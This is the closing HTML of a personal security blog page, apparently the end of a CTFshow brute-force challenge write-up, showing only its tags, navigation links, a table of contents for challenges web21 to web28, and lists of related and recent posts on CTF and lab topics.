href="/tags/%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8/">工具利用</a><a class="post-meta__tags" href="/tags/%E7%88%86%E7%A0%B4/">爆破</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/article/ctfshow-webbasic-rce-1/" title="Web入门_命令执行_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Web入门_命令执行_1</div></div></a></div><div class="next-post pull-right"><a href="/article/ctfshow-webbasic-information-gathering/" title="Web入门_信息收集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Web入门_信息收集</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/article/ctfshow-webbasic-codeaudit/" title="Web入门_代码审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-08</div><div class="title">Web入门_代码审计</div></div></a></div><div><a href="/article/ctfshow-webbasic-information-gathering/" title="Web入门_信息收集"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Web入门_信息收集</div></div></a></div><div><a href="/article/ctfshow-webbasic-rce-1/" title="Web入门_命令执行_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-04</div><div class="title">Web入门_命令执行_1</div></div></a></div><div><a href="/article/ctfshow-webbasic-rce-2/" title="Web入门_命令执行_2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-05</div><div class="title">Web入门_命令执行_2</div></div></a></div><div><a href="/article/ctfshow-webbasic-rce-3/" title="Web入门-命令执行-3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-08</div><div class="title">Web入门-命令执行-3</div></div></a></div><div><a href="/article/Brainpan-1/" title="Brainpan-1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-02</div><div class="title">Brainpan-1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/tx.png" onerror="this.onerror=null;this.src='/img/sddd.gif'" alt="avatar"/></div><div class="author-info__name">Creexile</div><div class="author-info__description">Don't walk with waning motive.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">90</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">106</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web21"><span class="toc-number">1.1.</span> <span class="toc-text">web21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web22"><span class="toc-number">1.2.</span> <span class="toc-text">web22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web23"><span class="toc-number">1.3.</span> <span class="toc-text">web23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web24"><span class="toc-number">1.4.</span> <span class="toc-text">web24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web25"><span class="toc-number">1.5.</span> <span class="toc-text">web25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web26"><span class="toc-number">1.6.</span> <span class="toc-text">web26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web27"><span class="toc-number">1.7.</span> <span class="toc-text">web27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web28"><span class="toc-number">1.8.</span> <span class="toc-text">web28</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/Kioptrix-1-2/" title="Kioptrix-1.2">Kioptrix-1.2</a><time datetime="2025-07-26T14:40:56.500Z" title="Updated 2025-07-26 22:40:56">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/12855/" title="Python原型链污染">Python原型链污染</a><time datetime="2025-07-26T14:36:57.574Z" title="Updated 2025-07-26 22:36:57">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss-labs/" title="xss-labs">xss-labs</a><time datetime="2025-07-26T14:36:12.925Z" title="Updated 2025-07-26 22:36:12">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/xss/" title="XSS">XSS</a><time datetime="2025-07-26T14:35:45.178Z" title="Updated 2025-07-26 22:35:45">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/jarbas-1/" title="jarbas-1">jarbas-1</a><time datetime="2025-07-26T14:13:02.073Z" title="Updated 2025-07-26 22:13:02">2025-07-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/article/vulnstack-5/" title="VulnStack-红日5">VulnStack-红日5</a><time datetime="2025-07-26T13:23:05.723Z" title="Updated 2025-07-26 21:23:05">2025-07-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By Creexile</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async src="/js/custom.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
